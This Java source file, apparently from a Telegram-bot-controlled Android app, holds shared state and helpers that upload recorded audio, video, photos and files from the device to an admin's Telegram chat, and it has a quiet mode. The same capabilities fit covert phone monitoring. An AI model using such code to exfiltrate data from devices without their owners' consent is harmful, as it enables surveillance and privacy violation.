package com.pulse.control;

import android.content.Context;

/**
 * Global context + pending-session state shared by the bot engine, the UI and
 * background helpers. Initialised from the Application object.
 */
public final class Act {

    private static Context app;

    /** "text" | "tts" | "url" | "app" | "textfield" | "sched" | "adm" | "pin" */
    private static volatile String mode;
    private static volatile String arg;
    private static volatile long modeChat;
    private static volatile long modeAt;

    private Act() {}

    static void init(Context c) { app = c.getApplicationContext(); }

    public static Context ctx() { return app; }

    public static String token() { return Config.get(app).token; }

    public static long adminId() { return Config.get(app).adminId(); }

    // ------------------------------------------------------------ pending input

    public static void setMode(String m, String a, long chat) {
        mode = m;
        arg = a;
        modeChat = chat;
        modeAt = System.currentTimeMillis();
    }

    public static String mode() { return mode; }

    public static String arg() { return arg; }

    public static long modeChat() { return modeChat; }

    /** Pending input expires after 5 minutes. */
    public static boolean modeFresh() {
        return mode != null && System.currentTimeMillis() - modeAt < 5 * 60 * 1000;
    }

    public static void clearMode() {
        mode = null;
        arg = null;
        modeChat = 0;
    }

    // ------------------------------------------------------------ outbound shortcuts

    public static void sendToAdmin(String html, org.json.JSONObject kb) {
        if (Config.quiet(Act.ctx()) && (kb == null)) return;   // тихий режим
        new Thread(() -> {
            try {
                long a = adminId();
                if (a != 0) new TgApi(token()).sendMessage(a, html, kb);
            } catch (Exception ignored) {}
        }, "pulse-notify").start();
    }

    public static void sendVideo(byte[] data, String name, String caption) {
        try {
            long a = adminId();
            if (a == 0) return;
            Http.Resp r = new TgApi(token()).sendVideo(a, data, name, caption, Kb.main());
            LogStore.add(r.ok() ? "🎥 Видео отправлено" : "🎥 Видео не ушло: " + r.description());
        } catch (Exception e) {
            LogStore.add("🎥 Видео: " + e.getMessage());
        }
    }

    public static void sendAudio(byte[] data, String caption) {
        try {
            long a = adminId();
            if (a == 0) return;
            Http.Resp r = new TgApi(token()).sendAudio(a, data, "voice_" + System.currentTimeMillis() + ".m4a",
                    caption, Kb.main());
            LogStore.add(r.ok() ? "🎙 Аудио отправлено" : "🎙 Аудио не ушло: " + r.description());
        } catch (Exception e) {
            LogStore.add("🎙 Аудио: " + e.getMessage());
        }
    }

    public static void sendPhoto(byte[] jpeg, String caption) {
        try {
            long a = adminId();
            if (a == 0) return;
            Http.Resp r = new TgApi(token()).sendPhoto(a, jpeg, caption, Kb.main());
            LogStore.add(r.ok() ? "📷 Фото отправлено" : "📷 Фото не ушло: " + r.description());
        } catch (Exception e) {
            LogStore.add("📷 Фото: " + e.getMessage());
        }
    }

    public static void sendDoc(byte[] data, String name, String caption) {
        try {
            long a = adminId();
            if (a == 0) return;
            Http.Resp r = new TgApi(token()).sendDocument(a, data, name, caption, Kb.main());
            LogStore.add(r.ok() ? "📎 Файл отправлен" : "📎 Файл не ушёл: " + r.description());
        } catch (Exception e) {
            LogStore.add("📎 Файл: " + e.getMessage());
        }
    }
}
